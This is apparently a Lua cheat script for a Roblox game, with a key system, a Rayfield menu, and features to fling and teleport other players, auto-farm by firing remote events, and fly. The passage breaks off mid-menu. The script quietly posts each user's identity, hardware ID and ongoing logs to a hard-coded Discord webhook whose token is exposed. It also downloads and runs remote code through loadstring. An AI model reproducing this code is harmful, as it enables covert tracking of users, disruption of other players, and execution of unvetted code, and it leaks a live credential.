local Players    = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInput  = game:GetService("UserInputService")
local Workspace  = game:GetService("Workspace")
local Debris     = game:GetService("Debris")
local LP         = Players.LocalPlayer

local WEBHOOK_URL = "https://discord.com/api/webhooks/1559992063116713986/L1sxAIq2qu-cfz93ALDH58wN8gDbvfSj30KmFgJPzNYSZArQ5Dg7alOSsAxpgmby66Av"
local LOG_BATCH_INTERVAL = 3

-- ===================== KEY SYSTEM =====================
local VALID_KEYS = {
    ["XEMREO-A1B2-C3D4"] = "free",
    ["XEMREO-E5F6-G7H8"] = "free",
    ["XEMREO-I9J0-K1L2"] = "free",
    ["XEMREO-M3N4-O5P6"] = "free",
    ["XEMREO-Q7R8-S9T0"] = "free",
}
local KEY_FILE = "ftap_key.txt"

local function getHwid()
    local ok, hwid = pcall(function() return gethwid() end)
    if ok and hwid then return hwid end
    local ok2, cid = pcall(function() return game:GetService("RbxAnalyticsService"):GetClientId() end)
    if ok2 and cid then return cid end
    return "unknown_hwid"
end

local function loadSaved()
    if not readfile or not isfile then return nil, nil end
    local ok = pcall(function() return isfile(KEY_FILE) end)
    if not ok or not isfile(KEY_FILE) then return nil, nil end
    local ok2, content = pcall(readfile, KEY_FILE)
    if not ok2 or not content then return nil, nil end
    local savedKey, savedHwid = content:match("([^|]+)|(.+)")
    return savedKey, savedHwid
end

local function saveKey(key, hwid)
    if not writefile then return end
    pcall(writefile, KEY_FILE, key .. "|" .. hwid)
end

local CURRENT_HWID = getHwid()
local SAVED_KEY, SAVED_HWID = loadSaved()
local KEY_OK = false

if SAVED_KEY and SAVED_HWID == CURRENT_HWID then
    if VALID_KEYS[SAVED_KEY] ~= nil and VALID_KEYS[SAVED_KEY] ~= false then
        KEY_OK = true
    end
end

-- ===================== LOGGER =====================
local Log = { lines = {}, maxLines = 800, _queue = {} }
function Log:_write(level, msg)
    local line = string.format("[%s][%s] %s", os.date("%H:%M:%S"), level, msg)
    table.insert(self.lines, line)
    if #self.lines > self.maxLines then table.remove(self.lines, 1) end
    table.insert(self._queue, line)
    if #self._queue > 100 then table.remove(self._queue, 1) end
    print(line)
end
function Log:info(m)  self:_write("INFO",  m) end
function Log:warn(m)  self:_write("WARN",  m) end
function Log:error(m) self:_write("ERROR", m) end
function Log:dump()   return table.concat(self.lines, "\n") end
function Log:drainQueue()
    if #self._queue == 0 then return nil end
    local out = table.concat(self._queue, "\n")
    self._queue = {}
    return out
end

Log:info("Trainer booting")

local HttpService = game:GetService("HttpService")

local function jsonEscape(s)
    s = tostring(s or "")
    s = s:gsub("\\", "\\\\")
    s = s:gsub('"', '\\"')
    s = s:gsub("\n", "\\n")
    s = s:gsub("\r", "\\r")
    s = s:gsub("\t", "\\t")
    return s
end

-- ===================== RAYFIELD =====================
local Rayfield
local ok, err = pcall(function()
    Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
end)
if not ok or not Rayfield then
    warn("[Trainer] Rayfield load failed: " .. tostring(err))
    return
end

-- ===================== KEY GUI (if key not valid) =====================
if not KEY_OK then
    local KeyWindow = Rayfield:CreateWindow({
        Name = "Key System",
        LoadingTitle = "Key Check",
        LoadingSubtitle = "by xemreo",
        ConfigurationSaving = { Enabled = false },
        KeySystem = false,
    })

    local KeyTab = KeyWindow:CreateTab("Enter key")
    KeyTab:CreateSection("Activation")
    KeyTab:CreateParagraph({
        Title = "Key",
        Content = "Enter your key below. One key = one PC, permanent binding."
    })

    KeyTab:CreateInput({
        Name = "Key",
        CurrentValue = "",
        PlaceholderText = "XEMREO-XXXX-XXXX",
        RemoveTextAfterFocusLost = false,
        Callback = function(text)
            local key = text:upper():gsub("%s+", "")
            if key == "" then return end

            if VALID_KEYS[key] == nil then
                Log:warn("invalid key: " .. key)
                KeyTab:CreateParagraph({ Title = "FAIL", Content = "Invalid key." })
                return
            end

            if VALID_KEYS[key] == "free" then
                VALID_KEYS[key] = CURRENT_HWID
                saveKey(key, CURRENT_HWID)
                Log:info("key activated, reloading")
                KeyTab:CreateParagraph({ Title = "OK", Content = "Key activated. Loading..." })
                task.wait(1)
                loadstring(game:HttpGet("https://raw.githubusercontent.com/nalet666/ftap-trainer/main/ftap.lua"))()
                return
            end

            if VALID_KEYS[key] == CURRENT_HWID then
                saveKey(key, CURRENT_HWID)
                Log:info("key re-validated, reloading")
                KeyTab:CreateParagraph({ Title = "OK", Content = "Key valid. Loading..." })
                task.wait(1)
                loadstring(game:HttpGet("https://raw.githubusercontent.com/nalet666/ftap-trainer/main/ftap.lua"))()
                return
            end

            if VALID_KEYS[key] == false then
                Log:warn("key banned: " .. key)
                KeyTab:CreateParagraph({ Title = "FAIL", Content = "Key is banned." })
                return
            end

            Log:warn("key bound to another hwid: " .. key)
            KeyTab:CreateParagraph({ Title = "FAIL", Content = "Key is bound to another PC." })
        end,
    })

    return
end

Log:info("key ok, loading main")

-- ===================== MAIN TRAINER =====================
local function getExecutorName()
    local executors = {
        {name = "Synapse",     check = function() return syn and syn.protect_gui end},
        {name = "Script-Ware", check = function() return ScriptWare ~= nil end},
        {name = "Krnl",        check = function() return Krnl ~= nil end},
        {name = "Fluxus",      check = function() return fluxus ~= nil end},
        {name = "Delta",       check = function() return delta ~= nil end},
        {name = "Sirhurt",     check = function() return is_sirhurt_closure ~= nil end},
        {name = "Electron",    check = function() return electron ~= nil end},
        {name = "Wave",        check = function() return Wave ~= nil end},
        {name = "Oxygen",      check = function() return oxygen ~= nil end},
        {name = "Solara",      check = function() return Solara ~= nil end},
    }
    for _, e in ipairs(executors) do
        local ok2, r = pcall(e.check)
        if ok2 and r then return e.name end
    end
    local ok3, name = pcall(function() return identifyexecutor() end)
    if ok3 and name then return name end
    return "Unknown"
end

local function getAvatarUrl(userId)
    local ok2, url = pcall(function()
        return Players:GetUserThumbnailAsync(userId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
    end)
    if ok2 and url then return url end
    return nil
end

local function httpPost(url, body)
    local sent = false
    local headers = { ["Content-Type"] = "application/json" }
    if request then pcall(function() request({Url=url,Method="POST",Headers=headers,Body=body}); sent=true end) end
    if not sent and http_request then pcall(function() http_request({Url=url,Method="POST",Headers=headers,Body=body}); sent=true end) end
    if not sent and syn and syn.request then pcall(function() syn.request({Url=url,Method="POST",Headers=headers,Body=body}); sent=true end) end
    if not sent and http and http.post then pcall(function() http.post(url, body, headers); sent=true end) end
    return sent
end

local function sendBootWebhook()
    if not WEBHOOK_URL or WEBHOOK_URL == "" then return end
    local executor = getExecutorName()
    local hwid     = CURRENT_HWID
    local avatar   = getAvatarUrl(LP.UserId)
    local profile  = "https://www.roblox.com/users/" .. tostring(LP.UserId) .. "/profile"

    local embed = {
        title = "Trainer executed",
        description = "[" .. jsonEscape(LP.Name) .. "](" .. profile .. ") запустил скрипт",
        color = 5814783,
        fields = {
            { name = "Username",    value = "[" .. jsonEscape(LP.Name) .. "](" .. profile .. ")", inline = true },
            { name = "DisplayName", value = jsonEscape(LP.DisplayName), inline = true },
            { name = "UserId",      value = tostring(LP.UserId), inline = true },
            { name = "Account age", value = tostring(LP.AccountAge) .. " days", inline = true },
            { name = "Executor",    value = jsonEscape(executor), inline = true },
            { name = "PlaceId",     value = tostring(game.PlaceId), inline = true },
            { name = "HWID",        value = "```" .. jsonEscape(hwid) .. "```", inline = false },
            { name = "JobId",       value = game.JobId ~= "" and game.JobId or "—", inline = false },
        },
        footer = { text = "xemreo Trainer · " .. os.date("%Y-%m-%d %H:%M:%S") },
    }
    if avatar then embed.thumbnail = { url = avatar } end

    local ok2, body = pcall(function() return HttpService:JSONEncode({ username = "xemreo Trainer", embeds = { embed } }) end)
    if not ok2 or not body then Log:warn("webhook: JSONEncode failed"); return end
    if httpPost(WEBHOOK_URL, body) then Log:info("webhook: boot sent")
    else Log:warn("webhook: no HTTP method available") end
end

task.spawn(function() pcall(sendBootWebhook) end)

task.spawn(function()
    task.wait(3)
    while true do
        task.wait(LOG_BATCH_INTERVAL)
        local batch = Log:drainQueue()
        if batch and WEBHOOK_URL ~= "" then
            if #batch > 1800 then batch = batch:sub(1,1800) .. "\n...(truncated)" end
            local ok2, body = pcall(function()
                return HttpService:JSONEncode({ username = "xemreo Logger", content = "```\n" .. jsonEscape(batch) .. "\n```" })
            end)
            if ok2 and body then httpPost(WEBHOOK_URL, body) end
        end
    end
end)

local Window = Rayfield:CreateWindow({
    Name = "xemreo Trainer",
    LoadingTitle = "xemreo Trainer",
    LoadingSubtitle = "by xemreo",
    ConfigurationSaving = { Enabled = true, FolderName = "xemreo_Trainer", FileName = "config" },
    KeySystem = false,
})

local state = {
    superThrow = false, strength = 245, flingPlayers = true,
    moveSpeed = false, walkSpeed = 60,
    verticalBoost = false, verticalFactor = 0.5,
    megaFling = false, megaDistance = 100000,
    fly = false, flySpeed = 60, flyKey = Enum.KeyCode.F,
    antiGrab = false, sniffGrab = false,
    autoFarm = false, farmCooldown = 900, pickMode = false,
    escapeTime = 4, fastEscape = false,
    antiAfk = false, autoRejoin = false, lastJobId = nil,
}

local function isServicePart(p)
    if not p or not p.Parent then return true end
    local full = p:GetFullName()
    if full:find("GrabParts")          then return true end
    if full:find("GrabPart$")          then return true end
    if full:find("Workspace%.Camera")  then return true end
    if full:find("Workspace%.Map")     then return true end
    if full:find("BaseGround")         then return true end
    if full:find("Workspace%.Terrain") then return true end
    if full:find("Baseplate")          then return true end
    if full:find("Grass")              then return true end
    if full:find("Floor")              then return true end
    if p.Anchored                      then return true end
    return false
end

local function isPlayerPart(part)
    local players = Players:GetPlayers()
    for i = 1, #players do
        local plr = players[i]
        if plr ~= LP and plr.Character and part:IsDescendantOf(plr.Character) then
            return true
        end
    end
    return false
end

function findGrabbedPart(model)
    local grabPart = model:FindFirstChild("GrabPart")
    if grabPart then
        local wc = grabPart:FindFirstChild("WeldConstraint")
        if wc and wc:IsA("WeldConstraint") then
            local target = wc.Part1
            if target and not isServicePart(target) then return target, "WeldConstraint.Part1" end
            local alt = wc.Part0
            if alt and alt ~= grabPart and not isServicePart(alt) then return alt, "WeldConstraint.Part0-nonservice" end
            Log:warn("grab target rejected: " .. tostring(target and target:GetFullName() or "nil"))
            return nil, "rejected"
        end
    end
    local descendants = model:GetDescendants()
    for i = 1, #descendants do
        local c = descendants[i]
        if c:IsA("BasePart") and not isServicePart(c) then return c, "descendant-nonservice" end
    end
    return nil, "not-found"
end

local function megaVelocity(distance)
    local g = Workspace.Gravity
    if g <= 0 then g = 196.2 end
    local speed = math.sqrt(distance * g)
    if speed > 10000000 then speed = 10000000 end
    return Workspace.CurrentCamera.CFrame.LookVector * speed, speed
end

function boostPart(part)
    if not part or not part:IsA("BasePart") then Log:warn("boostPart: invalid part"); return end
    local full = part:GetFullName()
    if full:find("GrabParts") or full:find("GrabPart$") or full:find("Workspace%.Map")
       or full:find("BaseGround") or full:find("Grass") or full:find("Floor")
       or full:find("Workspace%.Terrain") then
        Log:warn("boostPart: refusing service/map part " .. full); return
    end
    if part.Anchored then Log:warn("boostPart: refusing anchored part " .. full); return end

    if isPlayerPart(part) then
        if not state.flingPlayers then
            Log:warn("boostPart: refusing player part (Fling Players OFF) " .. full); return
        end
        Log:info("boostPart: flinging player part " .. full)
    end

    local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
    if hrp then
        local dist = (part.Position - hrp.Position).Magnitude
        if dist < 5 then Log:warn(string.format("boostPart: part too close (%.1f studs), skipping", dist)); return end
    end

    local camDir = Workspace.CurrentCamera.CFrame.LookVector
    local target, speed
    if state.megaFling then
        target, speed = megaVelocity(state.megaDistance)
        Log:info(string.format("MEGA velocity %.0f studs/s (target ~%d studs)", speed, state.megaDistance))
    else
        target = camDir * state.strength
        speed = target.Magnitude
        Log:info(string.format("normal velocity %.0f", speed))
    end

    if state.verticalBoost then
        local up = Vector3.new(0, speed * state.verticalFactor, 0)
        target = target + up
        Log:info(string.format("vertical boost +%.0f up (factor %.2f)", up.Y, state.verticalFactor))
    end

    local children = part:GetChildren()
    for i = 1, #children do
        local c = children[i]
        if c:IsA("WeldConstraint") or c:IsA("Weld") or c:IsA("AlignPosition")
           or c:IsA("AlignOrientation") or c:IsA("RopeConstraint") then
            pcall(function() c:Destroy() end)
            Log:info("removed constraint: " .. c.ClassName)
        end
    end

    local ok1, err1 = pcall(function()
        part.AssemblyLinearVelocity = target
        part.Velocity = target
    end)
    if ok1 then Log:info("native vel set on " .. part.Name)
    else Log:warn("native vel failed: " .. tostring(err1)) end

    local bv = Instance.new("BodyVelocity")
    bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    bv.Velocity = target
    bv.Parent = part
    Debris:AddItem(bv, state.megaFling and 15 or 2)
    pcall(function() part:SetNetworkOwner(LP) end)
    Log:info("BodyVelocity attached (" .. (state.megaFling and "15s" or "2s") .. ")")
end

Workspace.ChildAdded:Connect(function(model)
    if not model:IsA("Model") then return end
    if not model.Name:lower():find("grab") then return end

    Log:info("grab model spawned: " .. model.Name)
    local part, how = findGrabbedPart(model)
    if not part then Log:warn("no valid grab target inside " .. model.Name); return end
    Log:info("tracking part via " .. how .. " -> " .. part:GetFullName())

    model:GetPropertyChangedSignal("Parent"):Connect(function()
        if model.Parent == nil then
            if state.superThrow or state.megaFling then
                Log:info("release detected -> boosting")
                boostPart(part)
            else
                Log:info("release detected, both modes OFF")
            end
        end
    end)
end)

local flyBody, flyGyro

function startFly()
    local char = LP.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hrp or not hum then return end

    hum.PlatformStand = true
    pcall(function() hum:ChangeState(Enum.HumanoidStateType.Physics) end)
    pcall(function() hrp:SetNetworkOwner(LP) end)

    flyBody = Instance.new("BodyVelocity")
    flyBody.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    flyBody.Velocity = Vector3.zero
    flyBody.Parent = hrp

    flyGyro = Instance.new("BodyGyro")
    flyGyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
    flyGyro.P = 100000
    flyGyro.D = 500
    flyGyro.Parent = hrp

    Log:info("fly started")
end

function stopFly()
    if flyBody then flyBody:Destroy(); flyBody = nil end
    if flyGyro then flyGyro:Destroy(); flyGyro = nil end
    local char = LP.Character
    if char then
        local hum = char:FindFirstChildOfClass("Humanoid")
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if hum then
            hum.PlatformStand = false
            pcall(function() hum:ChangeState(Enum.HumanoidStateType.GettingUp) end)
        end
        if hrp then pcall(function() hrp:SetNetworkOwner(nil) end) end
    end
    Log:info("fly stopped")
end

UserInput.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == state.flyKey and state.fly then
        if flyBody then stopFly() else startFly() end
    end
end)

RunService.RenderStepped:Connect(function()
    if state.fly and flyBody then
        local cam = Workspace.CurrentCamera
        local dir = Vector3.zero
        if UserInput:IsKeyDown(Enum.KeyCode.W) then dir = dir + cam.CFrame.LookVector end
        if UserInput:IsKeyDown(Enum.KeyCode.S) then dir = dir - cam.CFrame.LookVector end
        if UserInput:IsKeyDown(Enum.KeyCode.A) then dir = dir - cam.CFrame.RightVector end
        if UserInput:IsKeyDown(Enum.KeyCode.D) then dir = dir + cam.CFrame.RightVector end
        if UserInput:IsKeyDown(Enum.KeyCode.Space) then dir = dir + Vector3.new(0, 1, 0) end
        if UserInput:IsKeyDown(Enum.KeyCode.LeftControl) then dir = dir - Vector3.new(0, 1, 0) end
        if dir.Magnitude > 0 then
            flyBody.Velocity = dir.Unit * state.flySpeed
        else
            flyBody.Velocity = Vector3.zero
        end
        flyGyro.CFrame = cam.CFrame
    end
end)

LP.CharacterAdded:Connect(function()
    stopFly()
    if state.fly then
        task.wait(1.0)
        startFly()
    end
end)

RunService.Heartbeat:Connect(function()
    if not state.moveSpeed then return end
    local char = LP.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if hum and hum.WalkSpeed ~= state.walkSpeed then hum.WalkSpeed = state.walkSpeed end
end)

local function setMoveSpeed(enabled)
    state.moveSpeed = enabled
    local char = LP.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if hum and not enabled then hum.WalkSpeed = 16 end
    Log:info("moveSpeed = " .. tostring(enabled) .. (enabled and (" (" .. state.walkSpeed .. ")") or ""))
end

local antiGrabConns = {}

local function grabOwnerName(inst)
    local ownerVal = inst:FindFirstChild("Owner")
    if ownerVal and ownerVal:IsA("StringValue") then return ownerVal.Value end
    return nil
end

local function isMyGrabParts(inst)
    if inst.Name ~= "GrabParts" then return false end
    local owner = grabOwnerName(inst)
    if owner == LP.Name or owner == tostring(LP.UserId) or owner == LP.DisplayName then return true end
    return false
end

local function killIfMine(inst)
    if not state.antiGrab then return end
    if not isMyGrabParts(inst) then return end
    local owner = grabOwnerName(inst)
    inst:Destroy()
    Log:info("antiGrab: blocked own GrabParts (owner=" .. tostring(owner) .. ")")
end

function enableAntiGrab()
    local kids = Workspace:GetChildren()
    for i = 1, #kids do
        local inst = kids[i]
        if inst.Name == "GrabParts" and isMyGrabParts(inst) then
            inst:Destroy()
            Log:info("antiGrab: cleaned existing own GrabParts")
        end
    end
    antiGrabConns[#antiGrabConns + 1] = Workspace.ChildAdded:Connect(function(child)
        if not state.antiGrab then return end
        if child.Name ~= "GrabParts" then return end
        killIfMine(child)
    end)
    Log:info("antiGrab armed")
end

function disableAntiGrab()
    for i = 1, #antiGrabConns do antiGrabConns[i]:Disconnect() end
    antiGrabConns = {}
    Log:info("antiGrab disarmed")
end

LP.CharacterAdded:Connect(function()
    if state.antiGrab then
        task.wait(0.5)
        enableAntiGrab()
    end
end)

local sniffConns = {}

local function describe(inst, depth)
    local pad = string.rep("  ", depth or 0)
    Log:info(pad .. inst.ClassName .. " / " .. inst.Name .. " | Parent=" .. (inst.Parent and inst.Parent:GetFullName() or "nil"))
    local attrs = inst:GetAttributes()
    for i = 1, #attrs do
        local a = attrs[i]
        Log:info(pad .. "  attr: " .. a .. " = " .. tostring(inst:GetAttribute(a)))
    end
end

local function startSniff()
    if not state.sniffGrab then return end
    Log:info("=== sniffer armed ===")
    sniffConns[#sniffConns + 1] = Workspace.ChildAdded:Connect(function(child)
        if not state.sniffGrab then return end
        if not child.Name:lower():find("grab") then return end
        Log:info("--- WORKSPACE CHILD ADDED ---")
        describe(child, 0)
        local ds = child:GetDescendants()
        for i = 1, #ds do describe(ds[i], 1) end
    end)
    local char = LP.Character
    if char then
        sniffConns[#sniffConns + 1] = char.DescendantAdded:Connect(function(d)
            if not state.sniffGrab then return end
            if d.Name:lower():find("grab") then
                Log:info("--- CHAR DESCENDANT ADDED ---")
                describe(d, 0)
            end
        end)
    end
end

local function stopSniff()
    for i = 1, #sniffConns do sniffConns[i]:Disconnect() end
    sniffConns = {}
    Log:info("=== sniffer disarmed ===")
end

local autoFarmLoop = nil
local savedLevers = {}

local function tryActivate(inst)
    if not inst or not inst.Parent then return false end
    local cd = inst:FindFirstChildOfClass("ClickDetector")
    if not cd then
        local ds = inst:GetDescendants()
        for i = 1, #ds do
            if ds[i]:IsA("ClickDetector") then cd = ds[i]; break end
        end
    end
    if cd then
        pcall(function() fireclickdetector(cd) end)
        Log:info("autoFarm: clicked " .. inst:GetFullName())
        return true
    end
    local pp = inst:FindFirstChildOfClass("ProximityPrompt")
    if not pp then
        local ds = inst:GetDescendants()
        for i = 1, #ds do
            if ds[i]:IsA("ProximityPrompt") then pp = ds[i]; break end
        end
    end
    if pp then
        pcall(function() fireproximityprompt(pp) end)
        Log:info("autoFarm: prompted " .. inst:GetFullName())
        return true
    end
    local ds = inst:GetDescendants()
    for i = 1, #ds do
        if ds[i]:IsA("RemoteEvent") then
            pcall(function() ds[i]:FireServer() end)
            Log:info("autoFarm: fired " .. ds[i]:GetFullName())
            return true
        end
    end
    return false
end

function enableAutoFarm()
    if autoFarmLoop then return end
    autoFarmLoop = task.spawn(function()
        Log:info("autoFarm: loop started, cooldown " .. state.farmCooldown .. "s (" .. (state.farmCooldown / 60) .. " min)")
        while state.autoFarm do
            local total = 0
            for path, inst in pairs(savedLevers) do
                if not state.autoFarm then break end
                if inst and inst.Parent then
                    if tryActivate(inst) then total = total + 1 end
                else
                    savedLevers[path] = nil
                end
            end
            if total > 0 then Log:info("autoFarm: cycle done, " .. total .. " levers") end
            Log:info("autoFarm: next cycle at " .. os.date("%H:%M:%S", os.time() + state.farmCooldown))
            task.wait(state.farmCooldown)
        end
        Log:info("autoFarm: loop stopped")
    end)
end

function disableAutoFarm()
    if autoFarmLoop then
        pcall(function() task.cancel(autoFarmLoop) end)
        autoFarmLoop = nil
    end
    Log:info("autoFarm: disabled")
end

local pickConns = {}

local function describePicked(inst)
    Log:info("[PICK] Name: " .. inst.Name .. " | Class: " .. inst.ClassName)
    Log:info("       Path: " .. inst:GetFullName())
    local cd = inst:FindFirstChildOfClass("ClickDetector")
    if not cd then
        local ds = inst:GetDescendants()
        for i = 1, #ds do
            if ds[i]:IsA("ClickDetector") then cd = ds[i]; break end
        end
    end
    Log:info("       ClickDetector: " .. (cd and cd:GetFullName() or "no"))
    local pp = inst:FindFirstChildOfClass("ProximityPrompt")
    if not pp then
        local ds = inst:GetDescendants()
        for i = 1, #ds do
            if ds[i]:IsA("ProximityPrompt") then pp = ds[i]; break end
        end
    end
    Log:info("       ProximityPrompt: " .. (pp and pp:GetFullName() or "no"))
    local remotes = {}
    local ds = inst:GetDescendants()
    for i = 1, #ds do
        if ds[i]:IsA("RemoteEvent") then table.insert(remotes, ds[i].Name) end
    end
    Log:info("       RemoteEvents: " .. (#remotes > 0 and table.concat(remotes, ", ") or "no"))
end

local function startPickMode()
    stopPickMode()
    state.pickMode = true
    Log:info("=== pick mode armed (5s) — click a lever in game ===")
    local mouse = LP:GetMouse()
    pickConns[#pickConns + 1] = mouse.Button1Down:Connect(function()
        if not state.pickMode then return end
        local target = mouse.Target
        if not target then Log:warn("pick: no target under cursor"); return end
        savedLevers[target:GetFullName()] = target
        Log:info("pick: saved " .. target:GetFullName())
        describePicked(target)
    end)
    task.delay(5, function()
        if state.pickMode then
            stopPickMode()
            Log:info("=== pick mode ended ===")
        end
    end)
end

local function stopPickMode()
    state.pickMode = false
    for i = 1, #pickConns do pickConns[i]:Disconnect() end
    pickConns = {}
end

function listSavedLevers()
    local n = 0
    for path, _ in pairs(savedLevers) do
        n = n + 1
        Log:info("[SAVED] " .. path)
    end
    Log:info("total saved: " .. n)
end

function clearSavedLevers()
    savedLevers = {}
    Log:info("saved levers cleared")
end

local escapeConns  = {}
local escapeTimers = {}

local function waitForOwner(grabParts, timeout)
    timeout = timeout or 5
    local ov = grabParts:FindFirstChild("Owner")
    if not ov then
        local t0 = os.clock()
        while os.clock() - t0 < timeout do
            if not grabParts.Parent then return nil end
            ov = grabParts:FindFirstChild("Owner")
            if ov then break end
            task.wait(0.05)
        end
    end
    if not ov or not ov:IsA("StringValue") then return nil end
    if ov.Value ~= "" then return ov.Value end

    local got = nil
    local conn = ov:GetPropertyChangedSignal("Value"):Connect(function()
        if ov.Value ~= "" then got = ov.Value end
    end)

    local t0 = os.clock()
    while os.clock() - t0 < timeout and not got do
        if not grabParts.Parent then
            conn:Disconnect()
            return nil
        end
        task.wait(0.05)
    end
    conn:Disconnect()
    return got or (ov.Value ~= "" and ov.Value or nil)
end

local function isForeignGrabParts(inst, owner)
    if inst.Name ~= "GrabParts" then return false end
    if not owner then return false end
    if owner == LP.Name or owner == tostring(LP.UserId) or owner == LP.DisplayName then return false end
    return true
end

local function forceEscape()
    local char = LP.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChildOfClass("Humanoid")
    local removed = 0
    local kids = Workspace:GetChildren()
    for i = 1, #kids do
        local c = kids[i]
        if c.Name == "GrabParts" then
            local ov = c:FindFirstChild("Owner")
            local foreign = true
            if ov and ov:IsA("StringValue") then
                local o = ov.Value
                if o == LP.Name or o == tostring(LP.UserId) or o == LP.DisplayName then foreign = false end
            end
            if foreign then
                c:Destroy()
                removed = removed + 1
            end
        end
    end
    if hrp then
        pcall(function()
            hrp.AssemblyLinearVelocity = Vector3.new(0, 120, 0)
            hrp.Velocity = Vector3.new(0, 120, 0)
        end)
    end
    if hum then
        pcall(function()
            hum.PlatformStand = false
            hum:ChangeState(Enum.HumanoidStateType.GettingUp)
        end)
        hum.Health = hum.MaxHealth
    end
    Log:info("fastEscape: forced escape, removed " .. removed .. " GrabParts")
end

local function onGrabAttached(child)
    if not state.fastEscape then return end
    local owner = waitForOwner(child, 5)
    if not isForeignGrabParts(child, owner) then
        if owner then
            Log:info("fastEscape: ignoring own/unknown grab (owner=" .. tostring(owner) .. ")")
        else
            Log:info("fastEscape: no owner found, skipping")
        end
        return
    end
    Log:info("fastEscape: grabbed by " .. tostring(owner) .. ", escaping in " .. state.escapeTime .. "s")
    local key = tostring(child)
    if escapeTimers[key] then pcall(function() task.cancel(escapeTimers[key]) end) end
    escapeTimers[key] = task.delay(state.escapeTime, function()
        escapeTimers[key] = nil
        if state.fastEscape then forceEscape() end
    end)
end

function enableFastEscape()
    escapeConns[#escapeConns + 1] = Workspace.ChildAdded:Connect(function(child)
        if not state.fastEscape then return end
        if child.Name ~= "GrabParts" then return end
        task.spawn(function() onGrabAttached(child) end)
    end)
    Log:info("fastEscape armed (escapeTime=" .. state.escapeTime .. "s)")
end

function disableFastEscape()
    for i = 1, #escapeConns do escapeConns[i]:Disconnect() end
    escapeConns = {}
    for k, t in pairs(escapeTimers) do
        pcall(function() task.cancel(t) end)
        escapeTimers[k] = nil
    end
    Log:info("fastEscape disarmed")
end

LP.CharacterAdded:Connect(function()
    if state.fastEscape then
        task.wait(0.5)
        enableFastEscape()
    end
end)

local playerRows = {}

local function teleportToPlayer(target)
    local char = LP.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local tchar = target.Character
    if not tchar then Log:warn("teleport: " .. target.Name .. " has no character"); return end
    local thrp = tchar:FindFirstChild("HumanoidRootPart")
    if not thrp then return end
    hrp.CFrame = thrp.CFrame + Vector3.new(0, 3, 0)
    Log:info("teleport: moved to " .. target.Name)
end

local function teleportToMe(target)
    local char = LP.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local tchar = target.Character
    if not tchar then Log:warn("teleport: " .. target.Name .. " has no character"); return end
    local thrp = tchar:FindFirstChild("HumanoidRootPart")
    if not thrp then return end
    thrp.CFrame = hrp.CFrame + Vector3.new(3, 3, 0)
    Log:info("teleport: brought " .. target.Name .. " to you")
end

local PlayersTab

local function refreshPlayers()
    for _, btn in pairs(playerRows) do pcall(function() btn:Destroy() end) end
    playerRows = {}
    local players = Players:GetPlayers()
    table.sort(players, function(a, b) return a.Name < b.Name end)
    for i = 1, #players do
        local plr = players[i]
        local label = plr.Name .. (plr == LP and " (you)" or "")
        local b1 = PlayersTab:CreateButton({
            Name = "→ him: " .. label,
            Callback = function() teleportToPlayer(plr) end,
        })
        playerRows[plr.UserId .. "_him"] = b1
        local b2 = PlayersTab:CreateButton({
            Name = "→ me: " .. label,
            Callback = function() teleportToMe(plr) end,
        })
        playerRows[plr.UserId .. "_me"] = b2
    end
end

local antiAfkLoop = nil

local function enableAntiAfk()
    if antiAfkLoop then return end
    antiAfkLoop = task.spawn(function()
        Log:info("antiAfk: started")
        while state.antiAfk do
            pcall(function()
                local vu = game:GetService("VirtualUser")
                vu:CaptureController()
                vu:ClickButton2(Vector2.new())
            end)
            task.wait(240)
        end
        Log:info("antiAfk: stopped")
    end)
end

local function disableAntiAfk()
    if antiAfkLoop then pcall(function() task.cancel(antiAfkLoop) end); antiAfkLoop = nil end
    Log:info("antiAfk: disabled")
end

local rejoinConns = {}
local rejoinLoop = nil

local function getCurrentJobId()
    local ok2, jid = pcall(function() return game.JobId end)
    if ok2 and jid and jid ~= "" then return jid end
    return nil
end

local function attemptRejoin()
    local jid = state.lastJobId or getCurrentJobId()
    if not jid or jid == "" then Log:warn("autoRejoin: no jobId saved, can't rejoin"); return end
    Log:info("autoRejoin: trying to rejoin " .. jid)
    pcall(function()
        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, jid, LP)
    end)
end

local function enableAutoRejoin()
    state.lastJobId = getCurrentJobId()
    Log:info("autoRejoin: armed (jobId=" .. tostring(state.lastJobId) .. ")")
    rejoinConns[#rejoinConns + 1] = Players.PlayerRemoving:Connect(function(plr)
        if plr == LP and state.autoRejoin then
            Log:info("autoRejoin: you are leaving, saving jobId")
            state.lastJobId = getCurrentJobId()
        end
    end)
    rejoinConns[#rejoinConns + 1] = game:GetService("TeleportService").TeleportInitFailed:Connect(function()
        if not state.autoRejoin then return end
        Log:warn("autoRejoin: teleport failed, retrying in 10s")
        task.delay(10, attemptRejoin)
    end)
    rejoinLoop = task.spawn(function()
        while state.autoRejoin do
            task.wait(5)
            if not game:IsLoaded() then
                Log:warn("autoRejoin: game not loaded, retrying...")
                task.wait(5)
                attemptRejoin()
            end
        end
    end)
end

local function disableAutoRejoin()
    for i = 1, #rejoinConns do rejoinConns[i]:Disconnect() end
    rejoinConns = {}
    if rejoinLoop then pcall(function() task.cancel(rejoinLoop) end); rejoinLoop = nil end
    Log:info("autoRejoin: disarmed")
end

-- ===================== UI: FTAP =====================
local MainTab = Window:CreateTab("FTAP")

MainTab:CreateSection("Throw - Velocity")
MainTab:CreateToggle({
    Name = "Throw Velocity", CurrentValue = false, Flag = "SuperThrow",
    Callback = function(v) state.superThrow = v; Log:info("superThrow = " .. tostring(v)) end,
})
MainTab:CreateToggle({
    Name = "Fling Players", CurrentValue = true, Flag = "FlingPlayers",
